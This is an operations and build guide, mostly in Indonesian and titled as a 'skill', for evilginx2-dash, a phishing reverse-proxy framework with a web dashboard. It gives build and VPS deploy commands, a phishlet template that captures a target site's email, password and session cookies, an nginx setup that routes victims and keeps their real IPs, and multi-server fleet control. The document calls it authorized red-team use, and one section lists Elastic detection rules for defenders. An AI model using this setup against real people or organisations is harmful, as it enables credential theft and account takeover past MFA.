# Evilginx2-Dash — Environment Build & Operations Skill

## Ringkasan

**evilginx2-dash** adalah fork evilginx3 dengan embedded web dashboard untuk manajemen kampanye phishing MITM (reverse proxy). Single binary, semua komponen (DNS server, MITM proxy, dashboard API + SPA) berjalan dalam satu proses.

Digunakan dalam red-team engagement authorized untuk bypass MFA via session cookie hijacking.

---

## 1. Build Environment

### Prasyarat

| Tool | Versi Minimum | Catatan |
|------|--------------|---------|
| Go | 1.22+ | Toolchain support hingga Go 1.25 |
| Node.js | 25.x | Untuk build frontend dashboard |
| npm | 11.x | |
| make | - | Opsional |

### Build Backend

```bash
# Build dengan vendor dependencies
make build
# atau manual
go build -o ./build/evilginx -mod=vendor main.go
```

### Build Frontend Dashboard

```bash
cd dashboard/web
npm install
npm run build    # output ke dashboard/web/dist
# Re-build Go binary setelah frontend build
cd ../..
go build -o ./build/evilginx -mod=vendor main.go
```

### Cross-Compile untuk Linux (dari macOS)

```bash
./deploy/build-linux.sh
# Output: deploy/out/evilginx (static binary, CGO_ENABLED=0)
```

### Windows Build

```bash
build.bat          # build saja
build_run.bat      # build + run dengan -developer -debug
```

---

## 2. Run Modes

### Mode Lokal (Development)

```bash
# Developer mode: self-signed certs, debug log
./build/evilginx -p ./phishlets -t ./redirectors -developer -debug

# Dengan dashboard
EVILGINX_DASH_PASSWORD=Pass123 ./build/evilginx -p ./phishlets -developer -dashboard

# Headless (untuk systemd/production)
./build/evilginx -p ./phishlets -headless -dashboard

# Dengan agent API (fleet mode)
./build/evilginx -p ./phishlets -agent -agent-addr 127.0.0.1:8081
```

### Production Deployment (VPS)

1. Build: `./deploy/build-linux.sh`
2. Copy: `scp -r deploy/out/* root@<VPS>:/opt/evilginx/`
3. systemd: `deploy/evilginx.service` → `/etc/systemd/system/`
4. Firewall: buka port 80, 443, 22 (dashboard loopback saja)
5. Dashboard via SSH tunnel: `ssh -N -L 8080:127.0.0.1:8080 root@<VPS>`

### Deploy Script (1-command)

```bash
./deploy/build-linux.sh && ./deploy/push.sh root@<VPS_IP>
```

---

## 3. Command-Line Flags

| Flag | Default | Deskripsi |
|------|---------|-----------|
| `-p` | `./phishlets` | Direktori phishlets YAML |
| `-t` | `./redirectors` | Direktori redirector HTML |
| `-developer` | false | Self-signed TLS certs (testing) |
| `-debug` | false | Debug output |
| `-c` | `~/.evilginx` | Config directory |
| `-v` | false | Tampilkan versi |
| `-dashboard` | false | Enable web dashboard |
| `-dashboard-addr` | `127.0.0.1:8080` | Listen address dashboard |
| `-agent` | false | Enable agent API (fleet) |
| `-agent-addr` | `127.0.0.1:8081` | Agent API listen address |
| `-agent-token` | auto-generate | Static token untuk agent API |
| `-headless` | false | Run without interactive terminal |
| `-geoip-db` | auto-detect | Path ke MaxMind GeoLite2-City.mmdb |
| `-geoip-asn-db` | auto-detect | Path ke MaxMind GeoLite2-ASN.mmdb |

---

## 4. Arsitektur

```
┌─────────────────────────────────────────────────┐
│                evilginx proses                   │
│                                                   │
│  ┌──────────┐  ┌──────────┐  ┌────────────────┐  │
│  │ DNS      │  │ MITM     │  │ Dashboard API  │  │
│  │ Namesrv  │  │ HTTPS    │  │ gorilla/mux    │  │
│  │ :53      │  │ Proxy    │  │ :8080          │  │
│  └──────────┘  └──────────┘  └────────────────┘  │
│                                                    │
│  ┌──────────┐  ┌──────────┐  ┌────────────────┐  │
│  │ Terminal │  │ Config   │  │ BuntDB         │  │
│  │ (readln) │  │ Viper    │  │ (sessions)     │  │
│  └──────────┘  └──────────┘  └────────────────┘  │
│                                                    │
│  ┌────────────────────────────────────────────┐   │
│  │ go:embed dashboard/web/dist → SPA React    │   │
│  └────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

### Komponen Utama

| Package | Fungsi |
|---------|--------|
| `core/` | Engine: HTTP proxy, phishlet, config, cert, blacklist, session |
| `dashboard/` | Web API: auth, events (SSE), handlers, store (BuntDB) |
| `database/` | Session DB wrapper (BuntDB) |
| `log/` | Terminal logging dengan color output |
| `parser/` | Command-line parser untuk interactive terminal |

### Data Storage

| Path | Format | Isi |
|------|--------|-----|
| `~/.evilginx/config.json` | JSON | Config server, phishlets, lures |
| `~/.evilginx/data.db` | BuntDB | Captured sessions (creds, cookies, tokens) |
| `~/.evilginx/dashboard.db` | BuntDB | Users dashboard, audit log, JWT secret |
| `~/.evilginx/blacklist.txt` | Text | Daftar IP/CIDR blacklist |
| `~/.evilginx/crt/` | PEM | TLS certificates per hostname |
| `phishlets/*.yaml` | YAML | Phishlet definitions |
| `redirectors/` | HTML | Pre-phish redirector templates |

---

## 5. Tech Stack Detail

### Backend (Go)

| Dependency | Versi | Fungsi |
|------------|-------|--------|
| `certmagic` | v0.20.0 | Auto TLS (Let's Encrypt) |
| `go-acme/lego` | v3.1.0 | ACME client |
| `elazarl/goproxy` | pinned | MITM HTTP/HTTPS proxy |
| `miekg/dns` | v1.1.58 | DNS nameserver built-in |
| `go-vhost` | pinned | TLS SNI vhost demux |
| `chzyer/readline` | pinned | Interactive terminal |
| `spf13/viper` | v1.10.1 | Config management |
| `tidwall/buntdb` | v1.1.0 | Embedded key-value store |
| `gorilla/mux` | v1.7.3 | HTTP routing (dashboard) |
| `fatih/color` | v1.13.0 | Terminal colored output |
| `go.uber.org/zap` | v1.27.0 | Logging (certmagic) |

### Frontend (Dashboard)

| Dependency | Versi | Fungsi |
|------------|-------|--------|
| react / react-dom | ^18.3.1 | UI framework |
| react-router-dom | ^6.26.2 | Client routing (HashRouter) |
| vite | ^5.4.8 | Build tool / dev server |
| tailwindcss | ^4.0.0 | Utility CSS |
| lucide-react | ^0.460.0 | Icons |
| js-yaml | ^4.2.0 | YAML parsing (phishlet editor) |

---

## 6. Phishlet Format

Minimal valid skeleton:

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'target.com', session: true, is_landing: true, auto_filter: true}
sub_filters: []
auth_tokens:
  - {domain: '.target.com', keys: ['session']}
credentials:
  username: {key: 'email', search: '(.*)', type: 'post'}
  password: {key: 'password', search: '(.*)', type: 'post'}
login: {domain: 'www.target.com', path: '/login'}
```

Key sections:
- **proxy_hosts**: Map subdomain phising ke subdomain target
- **auth_tokens**: Cookie/body/header yang menandai session berhasil dicapture
- **credentials**: Form field username, password + custom fields
- **login**: Domain + path login page target
- **sub_filters**: Content rewriting (URL replacement)
- **js_inject**: Inject JavaScript ke halaman tertentu
- **force_post**: Force/override POST field values
- **intercept**: Return canned response tanpa proxy
- **params**: Template parameters untuk child phishlets

---

## 7. Dashboard API Endpoints

### Public
- `POST /api/auth/login`
- `GET /api/health`

### Authenticated (any role)
- `GET /api/auth/me`, `POST /api/auth/password`
- `GET /api/events` (SSE live updates)
- `GET /api/stats`, `GET /api/config`
- `GET /api/sessions`, `GET /api/sessions/export`
- `GET /api/lures`, `GET /api/phishlets`

### Operator+
- `DELETE /api/sessions/{id}`
- CRUD `/api/lures`, `/api/lures/{index}/url`, pause/unpause
- `POST /api/phishlets/enable|disable|import|validate|child`
- Phishlet YAML CRUD, hostname, hide/unhide, unauth_url
- Blacklist CRUD, import, clear

### Admin
- `PATCH /api/config`
- CRUD `/api/users`
- `GET /api/audit`
- Fleet: CRUD `/api/engines`

### Roles
- **viewer**: read-only
- **operator**: viewer + mutations (lures, phishlets, delete sessions)
- **admin**: operator + user management + audit

---

## 8. Fleet Architecture

```
Dashboard Host (control plane) ── WireGuard ── VPS A (engine + agent API)
                                              ├── VPS B (engine + agent API)
                                              └── VPS C (engine + agent API)
```

- Engine: `-agent -agent-addr <wg-ip>:8081 -agent-token <token>`
- Dashboard: registers engines via UI, proxies management, mirrors sessions
- Mirror store: durable copy of all engines' captured data

---

## 9. nginx Reverse Proxy Topology

evilginx membutuhkan L4 SNI pass-through (bukan L7 reverse proxy) karena:
- Engine terminates TLS sendiri (mint per-host cert)
- Engine reads real client IP dari socket

```nginx
stream {
    map $ssl_preread_server_name $upstream {
        login.target-corp.com   evilginx;
        default                 decoy;
    }
    upstream evilginx { server 127.0.0.1:8443; }
    server {
        listen 443;
        ssl_preread on;
        proxy_pass $upstream;
        proxy_protocol on;
    }
}
```

Enginge config: `config ipv4 bind 127.0.0.1`, `config https_port 8443`

PROXY protocol diperlukan agar engine melihat real victim IP, bukan 127.0.0.1.

---

## 10. AiTM Detection (Purple Team)

7 Elastic detection rules untuk mendeteksi evilginx:

| Rule | Signal | KQL |
|------|--------|-----|
| 1 | Session cookie dari multiple IP | `session.id` cardinality `source.ip` >= 2 |
| 1b | Session dari beda ASN | `session.id` cardinality `source.as.number` >= 2 |
| 2 | Auth sukses dari hosting ASN | `source.as.organization:(*amazon* or *digitalocean* or *hetzner* ...)` |
| 3 | Satu IP auth ke banyak user | `source.ip` cardinality `user.name` >= 5 |
| 4 | User-agent berubah dalam session | `session.id` cardinality `user_agent.original` >= 2 |
| 5 | DNS resolving domain lookalike | `dns.question.name:(*yourbrand* or *yourapp*)` |
| 6 | JA3 fingerprint Go client | `tls.client.ja3:"<observed-ja3>"` |
| 7 | Post-auth persistence actions | `event.action:(password_change or email_change ...)` |

---

## 11. Common Issues & Solutions

| Masalah | Solusi |
|---------|--------|
| Cloudflare proxy (orange cloud) blocking cert | Set DNS only (grey cloud) |
| Dashboard lupa password | Hapus `~/.evilginx/dashboard.db`, restart |
| Let's Encrypt rate limit | Test dengan 1 phishlet dulu |
| Port 53 can't bind | Tidak masalah jika pakai wildcard A record |
| Dashboard not showing new sessions | SSE poll interval 2s; refresh manual |
| Phishlet enable gagal | Pastikan base domain + hostname + external IP terisi |
| Certificate provisioning timeout | Pastikan port 80/443 reachable, DNS resolving |

---

## 12. File Structure

```
evilginx2-dash/
├── main.go                    # Entry point + flags
├── go.mod / go.sum            # Go modules
├── Makefile                   # Build commands
├── build.bat / build_run.bat  # Windows build
├── core/                      # Engine packages (17 files)
│   ├── config.go              # Config, Lure, PhishletConfig structs
│   ├── http_proxy.go          # MITM HTTPS proxy
│   ├── http_server.go         # HTTP server (ACME + redirect)
│   ├── nameserver.go          # DNS nameserver
│   ├── phishlet.go            # Phishlet loader + validation
│   ├── session.go             # Session management
│   ├── certdb.go              # Certificate database
│   ├── blacklist.go           # IP blacklist
│   ├── gophish.go             # Gophish integration
│   ├── dashboard_export.go    # Read-only bridge for dashboard
│   ├── terminal.go            # Interactive terminal (readline)
│   ├── banner.go / help.go    # UI
│   ├── utils.go / shared.go   # Helpers
│   └── table.go / scripts.go  # Formatting
├── dashboard/                 # Web dashboard
│   ├── server.go              # HTTP server + routing
│   ├── auth.go                # JWT (HS256) + RBAC middleware
│   ├── store.go               # BuntDB store (users, audit)
│   ├── events.go              # SSE hub + poller
│   ├── embed.go               # go:embed of web/dist
│   ├── geoip.go               # MaxMind GeoIP lookup
│   ├── agent_client.go        # Fleet agent HTTP client
│   ├── handlers_*.go          # API handlers
│   ├── *_test.go              # Tests
│   ├── README.md              # Dashboard docs
│   └── web/                   # React SPA (Vite + Tailwind)
├── database/                  # Session database
│   ├── database.go            # BuntDB session store
│   └── db_session.go          # Session types
├── log/                       # Terminal logging
├── parser/                    # CLI parser
├── phishlets/                 # YAML phishlet definitions
│   └── example.yaml           # Example phishlet
├── redirectors/               # Pre-phish HTML templates
├── deploy/                    # Deployment scripts
│   ├── DEPLOY.md              # Deploy documentation
│   ├── build-linux.sh         # Cross-compile script
│   ├── push.sh                # Remote deploy script
│   └── evilginx.service       # systemd unit
├── docs/                      # Documentation
│   ├── PHISHLET_FORMAT.md     # Phishlet format reference
│   ├── FLEET_ARCHITECTURE.md  # Fleet/control plane docs
│   ├── AITM_DETECTION_ELASTIC.md  # Detection playbook
│   └── NGINX_TOPOLOGY.md      # nginx fronting guide
├── vendor/                    # Vendored Go dependencies
└── media/                     # Images
```
